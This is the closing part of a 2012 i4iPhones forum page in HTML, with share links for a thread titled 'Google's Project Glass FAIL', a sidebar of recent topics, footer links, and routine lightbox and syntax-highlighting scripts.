+		<li><a href="http://i4iphones.info/index.php?sharelink=reddit;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Share this link via Reddit" class='_slink' id='slink_reddit'><img src="http://i4iphones.info/public/style_extra/sharelinks/reddit.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=stumble;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Share this link via StumbleUpon" class='_slink' id='slink_stumble'><img src="http://i4iphones.info/public/style_extra/sharelinks/stumble.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=email;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Share this link via Email" class='_slink' id='slink_email'><img src="http://i4iphones.info/public/style_extra/sharelinks/email.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=print;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Print" class='_slink' id='slink_print'><img src="http://i4iphones.info/public/style_extra/sharelinks/print.png" /></a></li>
+	
+
+		<li><a href="http://i4iphones.info/index.php?sharelink=download;aHR0cDovL2k0aXBob25lcy5pbmZvL3RvcGljLzIyNTk0LWdvb2dsZXMtcHJvamVjdC1nbGFzcy1mYWlsLw,,;R29vZ2xlJiMzOTtzIFByb2plY3QgR2xhc3MgRkFJTA,," rel="nofollow" target="_blank" title="Download" class='_slink' id='slink_download'><img src="http://i4iphones.info/public/style_extra/sharelinks/download.png" /></a></li>
+	
+	</ul>
+	<script type="text/javascript">
+		ipb.sharelinks.url   = "http://i4iphones.info/topic/22594-googles-project-glass-fail/";
+		ipb.sharelinks.title = "Google&#39;s Project Glass FAIL";
+		ipb.sharelinks.bname = "i4iPhones";
+	</script>
+</span>
+
+                1897 Views &middot;
+                0 Replies
+	
+                
+                	
+            </h3>
+                        
+	</div>
+
+
+</div>
+      </div>
+      <div class='ipsLayout_right'>
+	   <div class='ipsSideBlock'>
+        <h3>Site Navigation</h3>
+	<ul>
+		
+			<li>&bull; <a href="http://i4iphones.info/index.php?">Forums</a></li>		
+		
+
+			<li>&bull; <a href="http://i4iphones.info/index.php?app=forums&amp;module=extras&amp;section=stats">Today's Top 20 Posters</a></li>		
+		
+
+			<li>&bull; <a href="http://i4iphones.info/index.php?app=forums&amp;module=extras&amp;section=stats&amp;do=leaders">Contact Staff</a></li>		
+		
+	</ul>
+</div>
+	   
+	   <div class='ipsSideBlock'>
+     <h3>Latest Discussions</h3>
+		<ul class='ipsList_withminiphoto'>
+		
+		<li class='clearfix'>
+			<a href='http://i4iphones.info/user/306478-i4igirl%ef%a3%bf/' title='View Profile' class='ipsUserPhotoLink left'><img src='http://i4iphones.info/uploads/profile/photo-thumb-306478.jpg' alt="i4iGIRLPhoto" class='ipsUserPhoto ipsUserPhoto_mini' /></a>
+			<div class='list_content'>
+				<a href='http://i4iphones.info/topic/22638-ummm-shout-box-not-working/' rel='bookmark' class='ipsType_small' title=''>Ummm shout box not workiNG</a>
+				<p class='desc ipsType_smaller'>
+					<a hovercard-ref="member" hovercard-id="306478" class="_hovertrigger url fn" href='http://i4iphones.info/user/306478-i4igirl%ef%a3%bf/' title='View Profile'>i4iGIRL</a>
+					- Jun 05 2012 11:37 AM
+				</p>
+			</div>
+		</li>
+		
+
+		<li class='clearfix'>
+			<a href='http://i4iphones.info/user/248427-timomthymadden83/' title='View Profile' class='ipsUserPhotoLink left'><img src='http://i4iphones.info/public/style_images/infinite/profile/default_large.png' alt="timomthy.madden83Photo" class='ipsUserPhoto ipsUserPhoto_mini' /></a>
+			<div class='list_content'>
+				<a href='http://i4iphones.info/topic/22637-movies/' rel='bookmark' class='ipsType_small' title=''>movies?</a>
+				<p class='desc ipsType_smaller'>
+					<a hovercard-ref="member" hovercard-id="248427" class="_hovertrigger url fn" href='http://i4iphones.info/user/248427-timomthymadden83/' title='View Profile'>timomthy.madden83</a>
+					- May 26 2012 06:49 PM
+				</p>
+			</div>
+		</li>
+		
+
+		<li class='clearfix'>
+			<a href='http://i4iphones.info/user/329296-bas1/' title='View Profile' class='ipsUserPhotoLink left'><img src='http://i4iphones.info/uploads/profile/photo-thumb-329296.jpg' alt="Bas1Photo" class='ipsUserPhoto ipsUserPhoto_mini' /></a>
+			<div class='list_content'>
+				<a href='http://i4iphones.info/topic/22636-ios-511-jailbreak-untethered/' rel='bookmark' class='ipsType_small' title=''>iOS 5.1.1 Jailbreak Untethered</a>
+				<p class='desc ipsType_smaller'>
+					<a hovercard-ref="member" hovercard-id="329296" class="_hovertrigger url fn" href='http://i4iphones.info/user/329296-bas1/' title='View Profile'>Bas1</a>
+					- May 25 2012 11:18 AM
+				</p>
+			</div>
+		</li>
+		
+
+		<li class='clearfix'>
+			<a href='http://i4iphones.info/user/168768-thameran/' title='View Profile' class='ipsUserPhotoLink left'><img src='http://i4iphones.info/public/style_images/infinite/profile/default_large.png' alt="ThameranPhoto" class='ipsUserPhoto ipsUserPhoto_mini' /></a>
+			<div class='list_content'>
+				<a href='http://i4iphones.info/topic/22635-what-napped-to-the-movies-on-i4-iphone-is-the-old-site-going-to-be-up-ever-again/' rel='bookmark' class='ipsType_small' title=''>What napped to the movies on i4 iPhone? Is the old site going to be up ever again?</a>
+				<p class='desc ipsType_smaller'>
+					<a hovercard-ref="member" hovercard-id="168768" class="_hovertrigger url fn" href='http://i4iphones.info/user/168768-thameran/' title='View Profile'>Thameran</a>
+					- May 24 2012 07:42 PM
+				</p>
+			</div>
+		</li>
+		
+
+		<li class='clearfix'>
+			<a href='http://i4iphones.info/user/84896-bob1234/' title='View Profile' class='ipsUserPhotoLink left'><img src='http://i4iphones.info/public/style_images/infinite/profile/default_large.png' alt="bob1234Photo" class='ipsUserPhoto ipsUserPhoto_mini' /></a>
+			<div class='list_content'>
+				<a href='http://i4iphones.info/topic/22634-delete-account/' rel='bookmark' class='ipsType_small' title=''>delete account?</a>
+				<p class='desc ipsType_smaller'>
+					<a hovercard-ref="member" hovercard-id="84896" class="_hovertrigger url fn" href='http://i4iphones.info/user/84896-bob1234/' title='View Profile'>bob1234</a>
+					- May 24 2012 05:42 PM
+				</p>
+			</div>
+		</li>
+		
+		</ul>
+</div>
+	   
+	   <div class='ipsSideBlock'>
+    <h3><a href="http://i4iphones.info/index.php?app=members&amp;module=online&amp;section=online">Online Users</a></h3>
+		<span class='desc'>2 members, 551 visitors and 0 anonymous users</span>
+		<br /><br />
+		<p>
+			<span class='name'>Google,</span> <span class='name'><a href='http://i4iphones.info/user/281915-alpz/' title='Today, 12:17 PM'>alpz</a>,</span> <span class='name'><a href='http://i4iphones.info/user/321632-syndicate05/' title='Today, 12:16 PM'>Syndicate05</a></span>					
+		</p>
+</div>
+      </div>
+</div>
+
+
+	<script type="text/javascript" src="http://i4iphones.info/public/js/3rd_party/prettify/prettify.js"></script>
+	<script type='text/javascript' src='http://i4iphones.info/public/js/3rd_party/prettify/lang-sql.js'></script>
+	<!-- By default we load generic code, php, css, sql and xml/html; load others here if desired -->
+	<script type="text/javascript">
+	//<![CDATA[
+		Event.observe( window, 'load', function(e){ prettyPrint() });
+	//]]>
+	</script><br /><div class='ipsType_smaller desc lighter right' style='clear: both; text-align:right;'>Powered By: Portal v1.0.1 by <a href='http://www.devfuse.com/' title='DevFuse home page'>DevFuse</a><br />Based on IP.Board Portal by <a href='http://www.invisionpower.com/products/board/' title='IP.Board Product Page'>Invision Power Services</a></div>
+				
+				<ol class='breadcrumb bottom ipsList_inline left clearfix clear'>
+											<li><a href='http://i4iphones.info/index'>i4iPhones</a></li>
+							
+						
+							<li><span class='nav_sep'>&rarr;</span> <a href='http://i4iphones.info/portal/' title='Return to Portal'>Portal</a></li>
+							
+						
+
+				</ol>
+			</div>
+			<!-- ::: FOOTER (Change skin, language, mark as read, etc) ::: -->
+			<div id='footer_utilities' class='clearfix clear'>
+				<a rel="nofollow" href='#top' id='bottomScroll' title='Go to top'><img src='http://i4iphones.info/public/style_images/infinite/top.png' alt='' /></a>
+				<ul class='ipsList_inline left'>
+					<li>
+						<img src='http://i4iphones.info/public/style_images/infinite/feed.png' alt='RSS Feed' id='rss_feed' class='clickable' />
+					</li>
+					
+					
+					<li>
+						<a rel="nofollow" id='mark_all_read' href="http://i4iphones.info/index.php?app=forums&amp;module=forums&amp;section=markasread&amp;marktype=all&amp;k=880ea6a14ea49e853634fbdc5015a024" title='Mark all as read'>Mark Community Read</a>
+						<ul id='mark_all_read_menucontent' class='ipbmenu_content' style='display: none'>
+							
+								<li>
+									
+								</li>
+							
+
+								<li>
+									<a href="http://i4iphones.info/index.php?app=forums&amp;module=forums&amp;section=markasread&amp;marktype=app&amp;markApp=forums&amp;k=880ea6a14ea49e853634fbdc5015a024">Forums</a>
+								</li>
+							
+							<li>
+								<a href="http://i4iphones.info/index.php?app=forums&amp;module=forums&amp;section=markasread&amp;marktype=all&amp;k=880ea6a14ea49e853634fbdc5015a024"><strong>Mark all as read</strong></a>
+							</li>
+						</ul>
+					</li>
+					<li>
+						<a href="http://i4iphones.info/index.php?app=core&amp;module=help" title='View help' rel="help" accesskey='6'>Help</a>
+					</li>				
+				</ul>
+				<!-- Copyright Information -->
+        				  <p id='copyright'>
+        				  	<a href='http://www.invisionpower.com/products/board/' title='Community Forum Software by Invision Power Services'>Community Forum Software by IP.Board</a></p>
+		<!-- / Copyright -->
+			<div class='skin_link'><a href="http://www.ipbforumskins.com">IPB skin</a> by <a href="http://www.ipbforumskins.com">IPBForumSkins</a></div>
+			</div>
+			
+			<div id='stats_div'></div>
+			
+				<script type='text/javascript' src='http://i4iphones.info/public/js/3rd_party/lightbox.js'></script>
+<script type='text/javascript'>
+//<![CDATA[
+	// Lightbox Configuration
+	LightboxOptions = Object.extend({
+	    fileLoadingImage:        'http://i4iphones.info/public/style_images/infinite/lightbox/loading.gif',     
+	    fileBottomNavCloseImage: 'http://i4iphones.info/public/style_images/infinite/lightbox/closelabel.gif',
+	    overlayOpacity: 0.8,   // controls transparency of shadow overlay
+	    animate: true,         // toggles resizing animations
+	    resizeSpeed: 7,        // controls the speed of the image resizing animations (1=slowest and 10=fastest)
+	    borderSize: 10,         //if you adjust the padding in the CSS, you will need to update this variable
+		// When grouping images this is used to write: Image # of #.
+		// Change it for non-english localization
+		labelImage: "Image",
+		labelOf: "of"
+	}, window.LightboxOptions || {});
+/* Watch for a lightbox image and set up our downloadbutton watcher */
+document.observe('click', (function(event){
+    var target = event.findElement('a[rel*="lightbox"]') || event.findElement('area[rel*="lightbox"]') || event.findElement('span[rel*="lightbox"]');
+    if (target) {
+        event.stop();
+        gbl_addDownloadButton();
+    }
+}).bind(this));
+var _to    = '';
+var _last  = '';
+function gbl_addDownloadButton()
+{
+	if ( typeof( ipsLightbox.lightboxImage ) != 'undefined' && ipsLightbox.lightboxImage.src )
+	{
+		if ( _last != ipsLightbox.lightboxImage.src )
+		{
+			if ( ! $('gbl_d') )
+			{
+				$('bottomNav').insert( { top: "<div id='gbl_d' style='text-align:right;padding-bottom:4px;'></div>" } );
+			}
+			
+			$('gbl_d').update( "<a href='"+ ipsLightbox.lightboxImage.src + "' target='_blank'><img src='http://i4iphones.info/public/style_images/infinite/lightbox/download-icon.png' /></a>" );
+			
+			_last = ipsLightbox.lightboxImage.src;
+		}
+	}
+	
+	/* Check for init and then keep checking for new image */
+	_to = setTimeout( "gbl_addDownloadButton()", 1000 );
+}
+//]]>
+</script>
+			
+		</div>
+		
+		
+	</body>
+</html>
